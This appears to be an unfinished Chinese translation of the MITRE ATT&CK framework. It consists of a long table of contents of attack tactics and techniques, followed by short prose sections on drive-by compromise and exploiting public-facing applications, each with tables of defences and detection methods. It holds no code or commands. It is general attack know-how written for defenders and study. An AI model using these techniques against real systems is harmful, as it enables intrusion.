      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-74)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-79)
    - [Rc.common (Rc.common)](#rccommon-rccommon)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-75)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-80)
    - [Re-opened Applications (重启应用)](#re-opened-applications-%e9%87%8d%e5%90%af%e5%ba%94%e7%94%a8)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-76)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-81)
    - [Redundant Access (冗余访问)](#redundant-access-%e5%86%97%e4%bd%99%e8%ae%bf%e9%97%ae)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-77)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-82)
    - [Registry Run Keys / Startup Folder (注册表运行键/启动文件夹)](#registry-run-keys--startup-folder-%e6%b3%a8%e5%86%8c%e8%a1%a8%e8%bf%90%e8%a1%8c%e9%94%ae%e5%90%af%e5%8a%a8%e6%96%87%e4%bb%b6%e5%a4%b9)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-78)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-83)
    - [Scheduled Task](#scheduled-task)
    - [Screensaver (屏幕保护)](#screensaver-%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-79)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-84)
    - [Security Support Provider (安全支持提供商)](#security-support-provider-%e5%ae%89%e5%85%a8%e6%94%af%e6%8c%81%e6%8f%90%e4%be%9b%e5%95%86)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-80)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-85)
    - [Server Software Component (服务器软件组件)](#server-software-component-%e6%9c%8d%e5%8a%a1%e5%99%a8%e8%bd%af%e4%bb%b6%e7%bb%84%e4%bb%b6)
      - [传输代理](#%e4%bc%a0%e8%be%93%e4%bb%a3%e7%90%86)
      - [SQL 存储过程](#sql-%e5%ad%98%e5%82%a8%e8%bf%87%e7%a8%8b)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-81)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-86)
    - [Service Registry Permissions Weakness (服务注册表权限缺陷)](#service-registry-permissions-weakness-%e6%9c%8d%e5%8a%a1%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%9d%83%e9%99%90%e7%bc%ba%e9%99%b7)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-82)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-87)
    - [Setuid and Setgid (Setuid 和 Setgid)](#setuid-and-setgid-setuid-%e5%92%8c-setgid)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-83)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-88)
    - [Shortcut Modification (快捷方式修改)](#shortcut-modification-%e5%bf%ab%e6%8d%b7%e6%96%b9%e5%bc%8f%e4%bf%ae%e6%94%b9)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-84)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-89)
    - [SIP and Trust Provider Hijacking (SIP和信任提供者劫持)](#sip-and-trust-provider-hijacking-sip%e5%92%8c%e4%bf%a1%e4%bb%bb%e6%8f%90%e4%be%9b%e8%80%85%e5%8a%ab%e6%8c%81)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-85)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-90)
    - [Startup Items (启动项)](#startup-items-%e5%90%af%e5%8a%a8%e9%a1%b9)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-86)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-91)
    - [System Firmware (系统固件)](#system-firmware-%e7%b3%bb%e7%bb%9f%e5%9b%ba%e4%bb%b6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-87)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-92)
    - [Systemd Service (系统服务)](#systemd-service-%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-88)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-93)
    - [Time Providers (时间提供程序)](#time-providers-%e6%97%b6%e9%97%b4%e6%8f%90%e4%be%9b%e7%a8%8b%e5%ba%8f)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-6)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-94)
    - [Trap](#trap)
    - [Valid Accounts](#valid-accounts)
    - [Web Shell (Web Shell)](#web-shell-web-shell)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-7)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-95)
    - [Windows Management Instrumentation Event Subscription (Windows 管理规范事件订阅)](#windows-management-instrumentation-event-subscription-windows-%e7%ae%a1%e7%90%86%e8%a7%84%e8%8c%83%e4%ba%8b%e4%bb%b6%e8%ae%a2%e9%98%85)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-89)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-96)
    - [Winlogon Helper DLL (Winlogon Helper DLL)](#winlogon-helper-dll-winlogon-helper-dll)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-90)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-97)
  - [Privilege Escalation (提权)](#privilege-escalation-%e6%8f%90%e6%9d%83)
    - [Access Token Manipulation (篡改访问令牌)](#access-token-manipulation-%e7%af%a1%e6%94%b9%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-91)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-98)
    - [Accessibility Features](#accessibility-features)
    - [AppCert DLLs](#appcert-dlls)
    - [AppInit DLLs](#appinit-dlls)
    - [Application Shimming](#application-shimming)
    - [Bypass User Account Control (UAC绕过)](#bypass-user-account-control-uac%e7%bb%95%e8%bf%87)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-92)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-99)
    - [DLL Search Order Hijacking](#dll-search-order-hijacking)
    - [Dylib Hijacking](#dylib-hijacking)
    - [Elevated Execution with Prompt (根据提示的高权限执行)](#elevated-execution-with-prompt-%e6%a0%b9%e6%8d%ae%e6%8f%90%e7%a4%ba%e7%9a%84%e9%ab%98%e6%9d%83%e9%99%90%e6%89%a7%e8%a1%8c)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-93)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-100)
    - [Emond](#emond)
    - [Exploitation for Privilege Escalation (利用特权升级)](#exploitation-for-privilege-escalation-%e5%88%a9%e7%94%a8%e7%89%b9%e6%9d%83%e5%8d%87%e7%ba%a7)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-94)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-101)
    - [Extra Window Memory Injection (窗口内存注入)](#extra-window-memory-injection-%e7%aa%97%e5%8f%a3%e5%86%85%e5%ad%98%e6%b3%a8%e5%85%a5)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-95)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-102)
    - [File System Permissions Weakness](#file-system-permissions-weakness)
    - [Hooking](#hooking)
    - [Image File Execution Options Injection](#image-file-execution-options-injection)
    - [Launch Daemon](#launch-daemon)
    - [New Service](#new-service)
    - [Parent PID Spoofing (PPID欺骗)](#parent-pid-spoofing-ppid%e6%ac%ba%e9%aa%97)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-96)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-103)
    - [Path Interception](#path-interception)
    - [Plist Modification](#plist-modification)
    - [Port Monitors](#port-monitors)
    - [PowerShell Profile](#powershell-profile)
    - [Process Injection (进程注入)](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5)
      - [Windows](#windows-3)
      - [Mac & Linux](#mac--linux)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-97)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-104)
    - [Scheduled Task](#scheduled-task-1)
    - [Service Registry Permissions Weakness](#service-registry-permissions-weakness)
    - [Setuid and Setgid](#setuid-and-setgid)
    - [SID-History Injection (SID-History 注入)](#sid-history-injection-sid-history-%e6%b3%a8%e5%85%a5)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-98)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-105)
    - [Startup Items](#startup-items)
    - [Sudo (Sudo)](#sudo-sudo)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-99)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-106)
    - [Sudo Caching (Sudo 缓存)](#sudo-caching-sudo-%e7%bc%93%e5%ad%98)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-100)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-107)
    - [Valid Accounts](#valid-accounts-1)
    - [Web Shell](#web-shell)
  - [Defense Evasion (防御规避)](#defense-evasion-%e9%98%b2%e5%be%a1%e8%a7%84%e9%81%bf)
    - [Access Token Manipulation](#access-token-manipulation)
    - [Application Access Token (应用程序访问令牌) (SaaS&Office 365)](#application-access-token-%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c-saasoffice-365)
      - [背景](#%e8%83%8c%e6%99%af-3)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-101)
      - [检测](#%e6%a3%80%e6%b5%8b-2)
    - [Binary Padding (二进制填充) (all)](#binary-padding-%e4%ba%8c%e8%bf%9b%e5%88%b6%e5%a1%ab%e5%85%85-all)
      - [背景](#%e8%83%8c%e6%99%af-4)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-2)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-102)
      - [检测](#%e6%a3%80%e6%b5%8b-3)
    - [BITS Jobs](#bits-jobs)
    - [Bypass User Account Control](#bypass-user-account-control)
    - [Clear Command History (清除命令历史记录) (Linux&MacOS)](#clear-command-history-%e6%b8%85%e9%99%a4%e5%91%bd%e4%bb%a4%e5%8e%86%e5%8f%b2%e8%ae%b0%e5%bd%95-linuxmacos)
      - [背景](#%e8%83%8c%e6%99%af-5)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-3)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-103)
      - [检测](#%e6%a3%80%e6%b5%8b-4)
    - [CMSTP](#cmstp)
    - [Code Signing (代码签名) (MacOS&Windows)](#code-signing-%e4%bb%a3%e7%a0%81%e7%ad%be%e5%90%8d-macoswindows)
      - [背景](#%e8%83%8c%e6%99%af-6)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-4)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-104)
      - [检测](#%e6%a3%80%e6%b5%8b-5)
    - [Compile After Delivery (交付后编译) (All)](#compile-after-delivery-%e4%ba%a4%e4%bb%98%e5%90%8e%e7%bc%96%e8%af%91-all)
      - [背景](#%e8%83%8c%e6%99%af-7)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-5)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-105)
      - [检测](#%e6%a3%80%e6%b5%8b-6)
    - [Compiled HTML File](#compiled-html-file)
    - [Component Firmware](#component-firmware)
    - [Component Object Model Hijacking](#component-object-model-hijacking)
    - [Connection Proxy (连接代理) (All)](#connection-proxy-%e8%bf%9e%e6%8e%a5%e4%bb%a3%e7%90%86-all)
      - [背景](#%e8%83%8c%e6%99%af-8)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-106)
      - [检测](#%e6%a3%80%e6%b5%8b-7)
      - [备注](#%e5%a4%87%e6%b3%a8)
    - [Control Panel Items](#control-panel-items)
    - [DCShadow (DCShadow)](#dcshadow-dcshadow)
      - [背景](#%e8%83%8c%e6%99%af-9)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-7)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-107)
      - [检测](#%e6%a3%80%e6%b5%8b-8)
    - [Deobfuscate/Decode Files or Information (反混淆/解码)](#deobfuscatedecode-files-or-information-%e5%8f%8d%e6%b7%b7%e6%b7%86%e8%a7%a3%e7%a0%81)
      - [背景](#%e8%83%8c%e6%99%af-10)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-8)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-108)
      - [检测](#%e6%a3%80%e6%b5%8b-9)
    - [Disabling Security Tools (瘫痪安全服务) (All)](#disabling-security-tools-%e7%98%ab%e7%97%aa%e5%ae%89%e5%85%a8%e6%9c%8d%e5%8a%a1-all)
      - [背景](#%e8%83%8c%e6%99%af-11)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-9)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-109)
      - [检测](#%e6%a3%80%e6%b5%8b-10)
    - [DLL Search Order Hijacking](#dll-search-order-hijacking-1)
    - [DLL Side-Loading (DLL旁路加载) (Windows)](#dll-side-loading-dll%e6%97%81%e8%b7%af%e5%8a%a0%e8%bd%bd-windows)
      - [背景](#%e8%83%8c%e6%99%af-12)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-10)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-110)
      - [检测](#%e6%a3%80%e6%b5%8b-11)
    - [Execution Guardrails (执行边界) (All)](#execution-guardrails-%e6%89%a7%e8%a1%8c%e8%be%b9%e7%95%8c-all)
      - [背景](#%e8%83%8c%e6%99%af-13)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-11)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-111)
      - [检测](#%e6%a3%80%e6%b5%8b-12)
      - [补充](#%e8%a1%a5%e5%85%85)
    - [Exploitation for Defense Evasion (漏洞利用免杀) (All)](#exploitation-for-defense-evasion-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%85%8d%e6%9d%80-all)
      - [背景](#%e8%83%8c%e6%99%af-14)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-12)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-112)
      - [检测](#%e6%a3%80%e6%b5%8b-13)
      - [补充](#%e8%a1%a5%e5%85%85-1)
    - [Extra Window Memory Injection](#extra-window-memory-injection)
    - [File and Directory Permissions Modification (文件目录权限修改) (All)](#file-and-directory-permissions-modification-%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95%e6%9d%83%e9%99%90%e4%bf%ae%e6%94%b9-all)
      - [背景](#%e8%83%8c%e6%99%af-15)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-13)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-113)
      - [检测](#%e6%a3%80%e6%b5%8b-14)
      - [补充](#%e8%a1%a5%e5%85%85-2)
    - [File Deletion (文件删除) (All)](#file-deletion-%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4-all)
      - [背景](#%e8%83%8c%e6%99%af-16)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-14)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-114)
      - [检测](#%e6%a3%80%e6%b5%8b-15)
    - [File System Logical Offsets](#file-system-logical-offsets)
      - [背景](#%e8%83%8c%e6%99%af-17)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af-15)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-115)
      - [检测](#%e6%a3%80%e6%b5%8b-16)
    - [Gatekeeper Bypass](#gatekeeper-bypass)
    - [Group Policy Modification](#group-policy-modification)
    - [Hidden Files and Directories](#hidden-files-and-directories)
    - [Hidden Users](#hidden-users)
    - [Hidden Window](#hidden-window)
    - [HISTCONTROL](#histcontrol)
    - [Image File Execution Options Injection](#image-file-execution-options-injection-1)
    - [Indicator Blocking](#indicator-blocking)
    - [Indicator Removal from Tools](#indicator-removal-from-tools)
    - [Indicator Removal on Host](#indicator-removal-on-host)
    - [Indirect Command Execution](#indirect-command-execution)
    - [Install Root Certificate](#install-root-certificate)
    - [InstallUtil](#installutil)
    - [Launchctl](#launchctl-1)
    - [LC_MAIN Hijacking](#lcmain-hijacking)
    - [Masquerading](#masquerading)
    - [Modify Registry](#modify-registry)
    - [Mshta](#mshta)
    - [Network Share](#network-share)
    - [Connection Removal](#connection-removal)
    - [NTFS File Attributes](#ntfs-file-attributes)
    - [Obfuscated Files or Information (混淆的文件或信息)](#obfuscated-files-or-information-%e6%b7%b7%e6%b7%86%e7%9a%84%e6%96%87%e4%bb%b6%e6%88%96%e4%bf%a1%e6%81%af)
    - [Parent PID Spoofing](#parent-pid-spoofing)
    - [Plist Modification](#plist-modification-1)
    - [Port Knocking](#port-knocking)
    - [Process Doppelgänging](#process-doppelg%c3%a4nging)
    - [Process Hollowing](#process-hollowing)
    - [Process Injection](#process-injection)
    - [Redundant Access](#redundant-access)
    - [Regsvcs/Regasm](#regsvcsregasm)
    - [Regsvr32](#regsvr32)
    - [Rootkit (Rootkit)](#rootkit-rootkit)
    - [Rundll32](#rundll32)
    - [Scripting](#scripting)
    - [Signed Binary Proxy Execution](#signed-binary-proxy-execution)
    - [Signed Script Proxy Execution](#signed-script-proxy-execution)
    - [SIP and Trust Provider Hijacking](#sip-and-trust-provider-hijacking)
    - [Software Packing](#software-packing)
    - [Space after Filename](#space-after-filename)
    - [Template Injectio](#template-injectio)
    - [Timestomp](#timestomp)
    - [Trusted Developer Utilities](#trusted-developer-utilities)
    - [Valid Accounts](#valid-accounts-2)
    - [Virtualization/Sandbox Evasion](#virtualizationsandbox-evasion)
    - [Web Service](#web-service)
    - [XSL Script Processing](#xsl-script-processing)
  - [Credential Access (凭证访问)](#credential-access-%e5%87%ad%e8%af%81%e8%ae%bf%e9%97%ae)
    - [Account Manipulation](#account-manipulation)
    - [Bash History](#bash-history)
    - [Brute Force](#brute-force)
    - [Credential Dumping](#credential-dumping)
    - [Credentials from Web Browsers](#credentials-from-web-browsers)
    - [Credentials in Files](#credentials-in-files)
    - [Credentials in Registry](#credentials-in-registry)
    - [Exploitation for Credential Access](#exploitation-for-credential-access)
    - [Forced Authentication](#forced-authentication)
    - [Hooking](#hooking-1)
    - [Input Capture](#input-capture)
    - [Input Prompt](#input-prompt)
    - [Kerberoasting](#kerberoasting)
    - [Keychain](#keychain)
    - [LLMNR/NBT-NS Poisoning and Relay](#llmnrnbt-ns-poisoning-and-relay)
    - [Network Sniffing](#network-sniffing)
    - [Password Filter DLL](#password-filter-dll)
    - [Private Keys](#private-keys)
    - [Securityd Memory](#securityd-memory)
    - [Steal Web Session Cookie](#steal-web-session-cookie)
    - [Two-Factor Authentication Interception](#two-factor-authentication-interception)
  - [Discovery (嗅探扫描)](#discovery-%e5%97%85%e6%8e%a2%e6%89%ab%e6%8f%8f)
    - [Account Discovery](#account-discovery)
    - [Application Window Discovery](#application-window-discovery)
    - [Browser Bookmark Discovery](#browser-bookmark-discovery)
    - [Domain Trust Discovery](#domain-trust-discovery)
    - [File and Directory Discovery](#file-and-directory-discovery)
    - [Network Service Scanning](#network-service-scanning)
    - [Network Share Discovery](#network-share-discovery)
    - [Network Sniffing](#network-sniffing-1)
    - [Password Policy Discovery](#password-policy-discovery)
    - [Peripheral Device Discovery](#peripheral-device-discovery)
    - [Permission Groups Discovery](#permission-groups-discovery)
    - [Process Discovery](#process-discovery)
    - [Query Registry (查询注册表)](#query-registry-%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%86%8c%e8%a1%a8)
    - [Remote System Discovery](#remote-system-discovery)
    - [Security Software Discovery](#security-software-discovery)
    - [Software Discovery](#software-discovery)
    - [System Information Discovery](#system-information-discovery)
    - [System Network Configuration Discovery](#system-network-configuration-discovery)
    - [System Network Connections Discovery](#system-network-connections-discovery)
    - [System Owner/User Discovery](#system-owneruser-discovery)
    - [System Service Discovery](#system-service-discovery)
    - [System Time Discovery](#system-time-discovery)
    - [Virtualization/Sandbox Evasion](#virtualizationsandbox-evasion-1)
  - [Lateral Movement (横向移动)](#lateral-movement-%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8)
    - [AppleScript](#applescript)
    - [Application Access Token](#application-access-token)
    - [Application Deployment Software](#application-deployment-software)
    - [Component Object Model and Distributed COM](#component-object-model-and-distributed-com)
    - [Exploitation of Remote Services](#exploitation-of-remote-services)
    - [Internal Spearphishing](#internal-spearphishing)
    - [Logon Scripts](#logon-scripts)
    - [Pass the Hash](#pass-the-hash)
    - [Pass the Ticket](#pass-the-ticket)
    - [Remote Desktop Protocol](#remote-desktop-protocol)
    - [Remote File Copy](#remote-file-copy)
    - [Remote Services (远程服务)](#remote-services-%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1)
    - [Replication Through Removable Media](#replication-through-removable-media)
    - [Shared Webroot](#shared-webroot)
    - [SSH Hijacking](#ssh-hijacking)
    - [Taint Shared Content](#taint-shared-content)
    - [Third-party Software](#third-party-software)
    - [Web Session Cookie](#web-session-cookie)
    - [Windows Admin Shares](#windows-admin-shares)
    - [Windows Remote Management](#windows-remote-management)
  - [Collection](#collection)
    - [Audio Capture](#audio-capture)
    - [Automated Collection](#automated-collection)
    - [Clipboard Data](#clipboard-data)
    - [Data from Information Repositories](#data-from-information-repositories)
    - [Data from Local System](#data-from-local-system)
    - [Data from Network Shared Drive](#data-from-network-shared-drive)
    - [Data from Removable Media](#data-from-removable-media)
    - [Data Staged](#data-staged)
    - [Email Collection](#email-collection)
    - [Input Capture](#input-capture-1)
    - [Man in the Browser](#man-in-the-browser)
    - [Screen Capture](#screen-capture)
    - [Video Capture](#video-capture)
  - [Command and Control](#command-and-control)
    - [Commonly Used Port](#commonly-used-port)
    - [Communication Through Removable Media](#communication-through-removable-media)
    - [Connection Proxy](#connection-proxy)
    - [Custom Command and Control Protocol](#custom-command-and-control-protocol)
    - [Custom Cryptographic Protocol](#custom-cryptographic-protocol)
    - [Data Encoding](#data-encoding)
    - [Data Obfuscation](#data-obfuscation)
    - [Domain Fronting](#domain-fronting)
    - [Domain Generation Algorithms](#domain-generation-algorithms)
    - [Fallback Channels](#fallback-channels)
    - [Multi-hop Proxy](#multi-hop-proxy)
    - [Multi-Stage Channels](#multi-stage-channels)
    - [Multiband Communication](#multiband-communication)
    - [Multilayer Encryption](#multilayer-encryption)
    - [Port Knocking](#port-knocking-1)
    - [Remote Access Tools](#remote-access-tools)
    - [Remote File Copy](#remote-file-copy-1)
    - [Standard Application Layer Protocol](#standard-application-layer-protocol)
    - [Standard Cryptographic Protocol](#standard-cryptographic-protocol)
    - [Standard Non-Application Layer Protocol](#standard-non-application-layer-protocol)
    - [Uncommonly Used Port](#uncommonly-used-port)
    - [Web Service](#web-service-1)
  - [Exfiltration](#exfiltration)
    - [Automated Exfiltration](#automated-exfiltration)
    - [Data Compressed](#data-compressed)
    - [Data Encrypted](#data-encrypted)
    - [Data Transfer Size Limits](#data-transfer-size-limits)
    - [Exfiltration Over Alternative Protocol](#exfiltration-over-alternative-protocol)
    - [Exfiltration Over Command and Control Channel](#exfiltration-over-command-and-control-channel)
    - [Exfiltration Over Other Network Medium](#exfiltration-over-other-network-medium)
    - [Exfiltration Over Physical Medium](#exfiltration-over-physical-medium)
    - [Scheduled Transfer](#scheduled-transfer)
  - [Impact](#impact)
    - [Account Access Removal](#account-access-removal)
    - [Data Destruction](#data-destruction)
    - [Data Encrypted for Impact](#data-encrypted-for-impact)
    - [Defacement](#defacement)
    - [Disk Content Wipe](#disk-content-wipe)
    - [Disk Structure Wipe](#disk-structure-wipe)
    - [Endpoint Denial of Service](#endpoint-denial-of-service)
    - [Firmware Corruption](#firmware-corruption)
    - [Inhibit System Recovery](#inhibit-system-recovery)
    - [Network Denial of Service](#network-denial-of-service)
    - [Resource Hijacking](#resource-hijacking)
    - [Runtime Data Manipulation](#runtime-data-manipulation)
    - [Service Stop](#service-stop)
    - [Stored Data Manipulation](#stored-data-manipulation)
    - [System Shutdown/RebootTransmitted Data Manipulation](#system-shutdownreboottransmitted-data-manipulation)

<!-- /TOC -->

***

## Perface

基于**MITRE ATT&CK模型**整理的文档式中译版。

建议针对**关键词语**采用双语对照，可以参照[**Initial Access**](#initial-access-%e5%88%9d%e5%a7%8b%e8%ae%bf%e9%97%ae)。

目前本文档处于未完成阶段 (19.12.06)

***

## Initial Access (初始访问)

>[攻击者正试图进入您的网络](https://attack.mitre.org/tactics/TA0001/)

**初始访问** 包括使用 **各种入口向量** 在网络中获得其 **初始入侵点** 的技术。用于获取 **入侵点** 技术包括 **针对性的鱼叉攻击** 和 **公共Web服务器** 。通过 **初始访问** 获得的 **入侵点** 可能支持进一步侵入，例如 **有效的帐户群** 和 **远程服务的外部使用权** ，也可能由于密码的修改而失效。

***

### Drive-by Compromise (路过式威胁)

>[原文链接](https://attack.mitre.org/techniques/T1189/)

**路过式威胁** 是指攻击者通过用户在正常浏览过程中访问网站来获得对系统的访问权限。使用此技术，通常会将用户的Web浏览器作为攻击目标，但攻击者也可能会将受侵害的网站用于非利用行为，例如获取应用程序访问令牌。

存在多种将漏洞利用代码传递给浏览器的方法，包括：

- 恶意代码的注入
- 恶意广告的投放
- 内置的Web内容 (论坛帖子、评论等等)

攻击者使用的网站通常是特定社区(例如政府，特定行业或地区)访问的网站，其目标是基于共同利益来威胁特定用户或一组用户。这种有针对性的攻击被称为战略性网络入侵或水坑攻击。

- 用户访问了托管了攻击者受控内容的网站
- 脚本会自动执行，通常会搜索存在漏洞的浏览器或插件版本
  - 可能要求用户通过启用脚本或活动的网站组件并忽略警告对话框来协助此过程
- 一旦发现有漏洞的版本，攻击代码将会传到浏览器
- 如果利用成功，那么除非有其他保护措施，否则它将使攻击者代码在用户的系统上执行
  - 在某些情况下，在提供漏洞利用代码之前，需要在初始扫描后再次访问网站
  
#### 防御方式

防御方式|描述
:--:|:--
**应用隔离与沙箱机制**|浏览器沙箱可用于减轻某些利用的影响，其他类型的虚拟化和应用程序微分段也可以减轻客户端利用的影响
**Exp防护**|查找漏洞利用过程中的行为的安全应用程序
**Web内容限制**|对于通过广告投放的恶意代码，**adblocker** 可以帮助阻止该代码首先执行。脚本阻止扩展可以帮助阻止可能在开发过程中普遍使用的JavaScript的执行
**更新软件**|确保所有浏览器和插件保持更新

#### 检测手段

- 防火墙和代理可以检查URL中潜在的已知危险域或参数
- 网络入侵检测系统，有时配合 **SSL/TLS MITM** 检测，可以查找已知的恶意脚本
- 合法网站的 **路过式威胁** 检测会很困难，还要寻找终端所提供的成功入侵的证据

***

### Exploit Public-Facing Application (利用大众化应用程序)

>[原文链接](https://attack.mitre.org/techniques/T1189/)

使用软件，数据或命令来利用面向 Internet 的计算机系统或程序中的脆弱点，从而导致意外或无法预期的行为。

- 系统的弱点可能是bug，故障或设计漏洞
- 这些应用程序通常是网站，但是可以包括数据库 (例如SQL)，标准服务 (例如SMB或SSH)以及具有 Internet 可访问开放套接字的任何其他应用程序
